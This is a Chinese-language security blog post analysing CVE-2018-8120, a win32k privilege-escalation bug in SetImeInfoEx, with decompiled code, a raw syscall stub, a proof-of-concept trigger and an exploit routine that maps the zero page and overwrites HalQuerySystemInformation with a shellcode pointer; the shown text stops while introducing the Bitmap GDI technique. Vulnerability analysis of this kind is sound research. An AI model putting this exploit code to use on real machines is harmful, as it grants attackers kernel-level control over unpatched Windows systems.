<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="HaCky的安全备忘录" type="application/atom+xml" />






<meta name="description" content="0x1 漏洞描述&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2018-8120漏洞是一个位于win32k模块中的SetImeInfoEx函数的任意地址覆盖漏洞，漏洞产生的根本原因是没有对tagWINDOWSTATION结构的spklList成员做有效性验证，就对其进行解引用，如果spklList为NUll的话，继而对其进行解引用，导致漏洞触发。">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2018-8120 内核提权漏洞分析">
<meta property="og:url" content="https://findream.github.io/2023/02/08/CVE-2018-8120内核提权漏洞分析/index.html">
<meta property="og:site_name" content="HaCky的安全备忘录">
<meta property="og:description" content="0x1 漏洞描述&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2018-8120漏洞是一个位于win32k模块中的SetImeInfoEx函数的任意地址覆盖漏洞，漏洞产生的根本原因是没有对tagWINDOWSTATION结构的spklList成员做有效性验证，就对其进行解引用，如果spklList为NUll的话，继而对其进行解引用，导致漏洞触发。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://hacky.wang/blog/20230208/7c4T86WJNlPl.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20230208/lOt8aj5ylpt1.png?imageslim">
<meta property="og:image" content="http://hacky.wang/blog/20230208/CuJbWD2T5uSX.png?imageslim">
<meta property="og:updated_time" content="2023-02-09T05:16:37.686Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2018-8120 内核提权漏洞分析">
<meta name="twitter:description" content="0x1 漏洞描述&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2018-8120漏洞是一个位于win32k模块中的SetImeInfoEx函数的任意地址覆盖漏洞，漏洞产生的根本原因是没有对tagWINDOWSTATION结构的spklList成员做有效性验证，就对其进行解引用，如果spklList为NUll的话，继而对其进行解引用，导致漏洞触发。">
<meta name="twitter:image" content="http://hacky.wang/blog/20230208/7c4T86WJNlPl.png?imageslim">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://findream.github.io/2023/02/08/CVE-2018-8120内核提权漏洞分析/"/>





  <title>CVE-2018-8120 内核提权漏洞分析 | HaCky的安全备忘录</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">HaCky的安全备忘录</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-schedule">
          <a href="/schedule/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
            
            日程表
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      
        
        <li class="menu-item menu-item-commonweal">
          <a href="/404/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
            
            公益404
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2023/02/08/CVE-2018-8120内核提权漏洞分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="HaCky">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="HaCky的安全备忘录">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2018-8120 内核提权漏洞分析</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-02-08T20:45:11+08:00">
                2023-02-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Windows-内核提权漏洞/" itemprop="url" rel="index">
                    <span itemprop="name">Windows 内核提权漏洞</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="0x1-漏洞描述"><a href="#0x1-漏洞描述" class="headerlink" title="0x1 漏洞描述"></a>0x1 漏洞描述</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2018-8120漏洞是一个位于win32k模块中的<code>SetImeInfoEx</code>函数的任意地址覆盖漏洞，漏洞产生的根本原因是没有对<code>tagWINDOWSTATION</code>结构的<code>spklList</code>成员做有效性验证，就对其进行解引用，如果<code>spklList</code>为NUll的话，继而对其进行解引用，导致漏洞触发。<br><a id="more"></a></p>
<h2 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<code>SetImeInfoEx</code>的反汇编结果，可知<code>pklFirst = pwinsta-&gt;spklList;</code>，在取出tagWINDOWSTATION结构体的<code>spklList</code>的成员之后，并没有对<code>pklFirst</code>进行有效性验证，便对<code>pklFirst</code>进行解引用操作,<code>while ( pklFirst-&gt;hkl != piiex-&gt;hkl)</code>,假设<code>pklFirst</code>为NULL，便导致任意地址覆盖漏洞。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __stdcall SetImeInfoEx(tagWINDOWSTATION *pwinsta, tagIMEINFOEX *piiex)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  tagKL *pklFirst; <span class="comment">// eax</span></div><div class="line">  tagIMEINFOEX *v4; <span class="comment">// eax</span></div><div class="line">  result = pwinsta;</div><div class="line">  <span class="keyword">if</span> ( pwinsta )</div><div class="line">  &#123;</div><div class="line">    pklFirst = pwinsta-&gt;spklList;               <span class="comment">// 没有对pklFirst 的合法性进行验证</span></div><div class="line">    <span class="keyword">while</span> ( pklFirst-&gt;hkl != piiex-&gt;hkl )       <span class="comment">// 如果pklFirst为NULL的话，对pklFirst进行解引用。会导致失败</span></div><div class="line">    &#123;</div><div class="line">      pklFirst = pklFirst-&gt;pklNext;</div><div class="line">      <span class="keyword">if</span> ( pklFirst == pwinsta-&gt;spklList )</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    v4 = pklFirst-&gt;piiex;</div><div class="line">    <span class="keyword">if</span> ( !v4 )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> ( !v4-&gt;fLoadFlag )</div><div class="line">      qmemcpy(v4, piiex, sizeof(tagIMEINFOEX));</div><div class="line">    result = <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;换言之，我们只需要进行构造一个<code>tagWINDOWSTATION</code>,使得tagWINDOWSTATION+0x14偏移的<code>spklList</code>成员为NULL，然后在对<code>spklList</code>进行解引用时。继而程序崩溃，导致任意地址覆盖漏洞。<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">2</span>: kd&gt; dt win32k!tagWINDOWSTATION</div><div class="line">   +<span class="number">0</span>x000 <span class="attribute">dwSessionId      </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x004 <span class="attribute">rpwinstaNext     </span>: Ptr32 tagWINDOWSTATION</div><div class="line">   +<span class="number">0</span>x008 <span class="attribute">rpdeskList       </span>: Ptr32 tagDESKTOP</div><div class="line">   +<span class="number">0</span>x00c <span class="attribute">pTerm            </span>: Ptr32 tagTERMINAL</div><div class="line">   +<span class="number">0</span>x010 <span class="attribute">dwWSF_Flags      </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x014 <span class="attribute">spklList         </span>: Ptr32 tagKL</div><div class="line">   +<span class="number">0</span>x018 <span class="attribute">ptiClipLock      </span>: Ptr32 tagTHREADINFO</div><div class="line">   +<span class="number">0</span>x01c <span class="attribute">ptiDrawingClipboard </span>: Ptr32 tagTHREADINFO</div><div class="line">   +<span class="number">0</span>x020 <span class="attribute">spwndClipOpen    </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x024 <span class="attribute">spwndClipViewer  </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x028 <span class="attribute">spwndClipOwner   </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x02c <span class="attribute">pClipBase        </span>: Ptr32 tagCLIP</div><div class="line">   +<span class="number">0</span>x030 <span class="attribute">cNumClipFormats  </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x034 <span class="attribute">iClipSerialNumber </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x038 <span class="attribute">iClipSequenceNumber </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x03c <span class="attribute">spwndClipboardListener </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x040 <span class="attribute">pGlobalAtomTable </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x044 <span class="attribute">luidEndSession   </span>: _LUID</div><div class="line">   +<span class="number">0</span>x04c <span class="attribute">luidUser         </span>: _LUID</div><div class="line">   +<span class="number">0</span>x054 <span class="attribute">psidUser         </span>: Ptr32 Void</div></pre></td></tr></table></figure></p>
<h2 id="0x3-漏洞验证"><a href="#0x3-漏洞验证" class="headerlink" title="0x3 漏洞验证"></a>0x3 漏洞验证</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对SetImeInfoEx进行交叉引用，发现是由<code>NtUserSetImeInfoEx</code>函数调用，首先，将传入的参数tagIMEINFOEX复制到piiex，然后创建一个WindowsStation，并将这两个作为参数传入SetImeInfoEx。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">int __stdcall NtUserSetImeInfoEx(tagIMEINFOEX *<span class="built_in">a1</span>)</div><div class="line">&#123;</div><div class="line">  int <span class="built_in">v1</span><span class="comment">; // esi</span></div><div class="line">  tagWINDOWSTATION *v2<span class="comment">; // eax</span></div><div class="line">  tagIMEINFOEX piiex<span class="comment">; // [esp+10h] [ebp-178h] BYREF</span></div><div class="line">  CPPEH_RECORD ms_exc<span class="comment">; // [esp+170h] [ebp-18h]</span></div><div class="line">  UserEnterUserCritSec()<span class="comment">;</span></div><div class="line">  if ( (*gpsi &amp; <span class="number">4</span>) != <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    qmemcpy(&amp;piiex, <span class="built_in">a1</span>, sizeof(piiex))<span class="comment">;</span></div><div class="line">    ms_exc.registration.TryLevel = -<span class="number">2</span><span class="comment">;</span></div><div class="line">    v2 = _GetProcessWindowStation(<span class="number">0</span>)<span class="comment">;</span></div><div class="line">    <span class="built_in">v1</span> = SetImeInfoEx(v2, &amp;piiex)<span class="comment">;</span></div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    UserSetLastError(<span class="number">120</span>)<span class="comment">;</span></div><div class="line">    <span class="built_in">v1</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">  &#125;</div><div class="line">  UserSessionSwitchLeaveCrit()<span class="comment">;</span></div><div class="line">  return <span class="built_in">v1</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于<code>NtUserSetImeInfoEx</code>函数并没有导出，只能通过系统调用的方式进行调用。首先将参数放到esi寄存器中，将调用号放到eax寄存机中，系统调用号可以利用PCHunter，在内核钩子–SSDT中，找到NtUserSetImeInfoEx的编号为550，也就是226，然后加上0x1000的偏移，就是0x1226.<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">BOOL __declspec(naked) CallNtUserSetImeInfoEx(PVOID arg0)</div><div class="line">&#123;</div><div class="line">    __asm</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">mov</span> <span class="built_in">esi</span>, arg0</div><div class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0x1226</span>           // NtUserSetImeInfoEx的调用号</div><div class="line">        <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0x7FFE0300</span></div><div class="line">        <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span>[<span class="built_in">edx</span>]</div><div class="line">        <span class="keyword">ret</span> <span class="number">4</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<code>NtUserSetImeInfoEx</code>函数和<code>SetImeInfoEx</code>的伪代码，函数验证需要两个基本条件，第一，根据传入<code>SetImeInfoEx</code>参数为<code>tagWINDOWSTATION</code>，需要使用<code>CreateWindowStation</code>函数创建一个WindowStation结构。第二，根据<code>v2 = _GetProcessWindowStation(0);</code>可以知道，需要将创建的WindowStation设置为当前进程的。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> POC_CVE_2018_8120()</div><div class="line">&#123;</div><div class="line">	<span class="built_in">BOOL</span> bRet = <span class="literal">TRUE</span>;</div><div class="line">	HWINSTA hSta = <span class="literal">NULL</span>;</div><div class="line">	<span class="comment">// 创建tagWINDOWSTATION结构体</span></div><div class="line">	hSta = CreateWindowStation(<span class="literal">NULL</span>, <span class="number">0</span>, READ_CONTROL, <span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (hSta == <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		printf(<span class="string">"CreateWindowStation"</span>, GetLastError());</div><div class="line">		bRet = <span class="literal">FALSE</span>;</div><div class="line">		<span class="keyword">return</span> bRet;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// 将创建的结构体设置到本进程中</span></div><div class="line">	<span class="keyword">if</span> (!SetProcessWindowStation(hSta))</div><div class="line">	&#123;</div><div class="line">		printf(<span class="string">"SetProcessWindowStation"</span>, GetLastError());</div><div class="line">		bRet = <span class="literal">FALSE</span>;</div><div class="line">		<span class="keyword">return</span> bRet;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">char</span> szBuf[<span class="number">0x15C</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">	CallNtUserSetImeInfoEx((PVOID)szBuf);</div><div class="line">	<span class="keyword">return</span> bRet;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="0x4-漏洞利用"><a href="#0x4-漏洞利用" class="headerlink" title="0x4 漏洞利用"></a>0x4 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据任意地址覆盖漏洞常规的利用方法，将ShellCode地址复制到HalQuerySystemInformation地址上，然后调用<code>NtQueryIntervalProfile</code>执行即可。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们开辟零页内存和获取HalQuerySystemInformation地址，开辟零页内存是为了后续能够有空间存放HalQuerySystemInformation地址和Shellcode，不至于在触发漏洞的时候崩溃。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 0地址分配内存</span></div><div class="line"><span class="keyword">if</span> (!AllocateZeroMemory())</div><div class="line">&#123;</div><div class="line">	bRet = FALSE;</div><div class="line">	<span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] AllocateZeroMemory\n"</span>);</div><div class="line"><span class="comment">// 获取保存HalQuerySystemInformation函数地址的地址</span></div><div class="line">PVOID pHalQuerySystemInformation = GetHalQuerySystemInformation();</div><div class="line"><span class="keyword">if</span> (!pHalQuerySystemInformation)</div><div class="line">&#123;</div><div class="line">	bRet = FALSE;</div><div class="line">	<span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] GetHalQuerySystemInformation\n"</span>);</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据伪代码描述，只需要v4，即pklFirst-&gt;piiex，存放的是HalQuerySystemInformation，piiex存放的是Shellcode，然后调用<code>NtUserSetImeInfoEx</code>触发任意地址读写，将Shellcode覆写到HalQuerySystemInformation地址上，最后调用NtQueryIntervalProfile执行即可。<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( pwinsta )</div><div class="line"> &#123;</div><div class="line">   <span class="function"><span class="title">pklFirst</span> = pwinsta-&gt;</span>spklList;               <span class="comment">// 没有对pklFirst 的合法性进行验证</span></div><div class="line">   <span class="function"><span class="title">while</span> ( pklFirst-&gt;</span><span class="function"><span class="title">hkl</span> != piiex-&gt;</span>hkl )       <span class="comment">// 如果pklFirst为NULL的话，对pklFirst进行解引用。会导致失败</span></div><div class="line">   &#123;</div><div class="line">     <span class="function"><span class="title">pklFirst</span> = pklFirst-&gt;</span>pklNext;</div><div class="line">     <span class="function"><span class="title">if</span> ( pklFirst == pwinsta-&gt;</span>spklList )</div><div class="line">       return <span class="number">0</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="function"><span class="title">v4</span> = pklFirst-&gt;</span>piiex;                       <span class="comment">// 存放HalQuerySystemInformation</span></div><div class="line">   <span class="keyword">if</span> ( !v4 )</div><div class="line">     return <span class="number">0</span>;</div><div class="line">   <span class="function"><span class="title">if</span> ( !v4-&gt;</span>fLoadFlag )</div><div class="line">     qmemcpy(v4, piiex, sizeof(tagIMEINFOEX)); <span class="comment">// piiex存放ShellCode地址</span></div><div class="line">   result = <span class="number">1</span>;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> Trigger_CVE_2018_8120()</div><div class="line">&#123;</div><div class="line">	<span class="built_in">BOOL</span> bRet = <span class="literal">TRUE</span>;</div><div class="line">	<span class="comment">// 0地址分配内存</span></div><div class="line">	<span class="keyword">if</span> (!AllocateZeroMemory())</div><div class="line">	&#123;</div><div class="line">		bRet = <span class="literal">FALSE</span>;</div><div class="line">		<span class="keyword">return</span> bRet;</div><div class="line">	&#125;</div><div class="line">	printf(<span class="string">"[*] AllocateZeroMemory\n"</span>);</div><div class="line">	<span class="comment">// 获取保存HalQuerySystemInformation函数地址的地址</span></div><div class="line">	PVOID pHalQuerySystemInformation = GetHalQuerySystemInformation();</div><div class="line">	<span class="keyword">if</span> (!pHalQuerySystemInformation)</div><div class="line">	&#123;</div><div class="line">		bRet = <span class="literal">FALSE</span>;</div><div class="line">		<span class="keyword">return</span> bRet;</div><div class="line">	&#125;</div><div class="line">	printf(<span class="string">"[*] GetHalQuerySystemInformation\n"</span>);</div><div class="line">	<span class="comment">// 指定被写入的地址</span></div><div class="line">	*(PDWORD)(<span class="number">0x2C</span>) = (DWORD)pHalQuerySystemInformation;</div><div class="line">	<span class="comment">// 绕过while循环的验证</span></div><div class="line">	*(PDWORD)(<span class="number">0x14</span>) = (DWORD)ShellCode_CVE_2018_8120;</div><div class="line">	<span class="keyword">char</span> szBuf[<span class="number">0x15C</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">	<span class="comment">// 指定要写入的内容是ShellCode的地址</span></div><div class="line">	*(PDWORD)szBuf = (DWORD)ShellCode_CVE_2018_8120;</div><div class="line">	<span class="comment">// 触发漏洞</span></div><div class="line">	<span class="keyword">if</span> (!CallNtUserSetImeInfoEx(szBuf))</div><div class="line">	&#123;</div><div class="line">		printf(<span class="string">"CallNtUserSetImeInfoEx"</span>, GetLastError());</div><div class="line">		bRet = <span class="literal">FALSE</span>;</div><div class="line">		<span class="keyword">return</span> bRet;</div><div class="line">	&#125;</div><div class="line">	printf(<span class="string">"[*] CallNtUserSetImeInfoEx\n"</span>);</div><div class="line">	<span class="comment">// 调用NtQueryIntervalProfile</span></div><div class="line">	<span class="keyword">if</span> (!CallNtQueryIntervalProfile())</div><div class="line">	&#123;</div><div class="line">		bRet = <span class="literal">FALSE</span>;</div><div class="line">		<span class="keyword">return</span> bRet;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> bRet;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是，在后续的调试中，发现并不是执行memcpy的操作，导致覆写失败。</p>
<h2 id="0x05-Bitmap-GDI"><a href="#0x05-Bitmap-GDI" class="headerlink" title="0x05 Bitmap GDI"></a>0x05 Bitmap GDI</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BitmapGDI，通过Bitmap对象泄露可供读写的内核区域，从而将任意地址覆写漏洞转化为任意地址读写漏洞。R3通过使用<code>CreateBitmap</code>函数创建一个Bitmap对象，在Bitmap对象中有一个指针pvScan0，指向一段内存域名。pvScan0指针可以在R3通过GetBitmaps以及SetBitmaps函数进行操作。至此，通过这两个函数，可以将一个任意地址复写漏洞转化成一个任意地址读写漏洞。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>CreateBitmap</code>函数原型如下,<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HRESULT CreateBitmap(<span class="name">UINT</span> uiWidth,</div><div class="line">                     UINT uiHeight,</div><div class="line">                     REFWICPixelFormatGUID pixelFormat,</div><div class="line">                     WICBitmapCreateCacheOption option,</div><div class="line">                     IWICBitmap **ppIBitmap)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
